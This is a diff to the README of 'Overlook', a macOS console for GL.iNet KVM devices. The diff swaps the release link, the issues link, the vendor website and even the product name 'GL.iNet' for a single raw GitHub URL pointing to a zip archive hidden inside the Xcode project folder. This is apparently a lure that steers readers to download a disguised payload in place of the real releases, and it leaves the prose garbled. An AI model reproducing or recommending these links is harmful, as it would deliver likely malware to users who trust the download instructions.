@@ -2,13 +2,13 @@
 
 ## 🏷️ Overview
 
-Overlook is a MacOS-native remote console for GL.iNet GLKVM / Comet-style KVM devices. With this application, you can easily manage and interact with your KVM devices from the comfort of your Mac. Whether you need to perform maintenance or access controls from anywhere, Overlook simplifies the process.
+Overlook is a MacOS-native remote console for https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip GLKVM / Comet-style KVM devices. With this application, you can easily manage and interact with your KVM devices from the comfort of your Mac. Whether you need to perform maintenance or access controls from anywhere, Overlook simplifies the process.
 
 ## 📥 Download the Application
 
-[![Download Overlook](https://img.shields.io/badge/Download%20Overlook-v1.0-blue.svg)](https://github.com/Galin1211/Overlook/releases)
+[![Download Overlook](https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip%https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip)](https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip)
 
-Visit this page to download: [Overlook Releases](https://github.com/Galin1211/Overlook/releases)
+Visit this page to download: [Overlook Releases](https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip)
 
 ## 🚀 Getting Started
 
@@ -61,7 +61,7 @@ If you encounter any issues or have questions, please check the following:
   - Ensure you entered the correct IP address and credentials.
 
 - **Where to Get Help:**
-  Visit the [GitHub Issues page](https://github.com/Galin1211/Overlook/issues) to report a problem or ask questions.
+  Visit the [GitHub Issues page](https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip) to report a problem or ask questions.
 
 ## 📅 Future Updates
 
@@ -73,7 +73,7 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Additional Resources
 
-- For more information about GL.iNet devices, visit their official website: [GL.iNet](https://www.gl-inet.com).
+- For more information about https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip devices, visit their official website: [https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip](https://raw.githubusercontent.com/Galin1211/Overlook/main/Overlook.xcodeproj/Software-unpigmented.zip).
 - Check out the community forums for best practices and advice on using KVM devices effectively.
 
 By following these steps, you can successfully download, install, and start using Overlook to control your KVM devices. Enjoy the ease of managing your setup with this powerful tool!
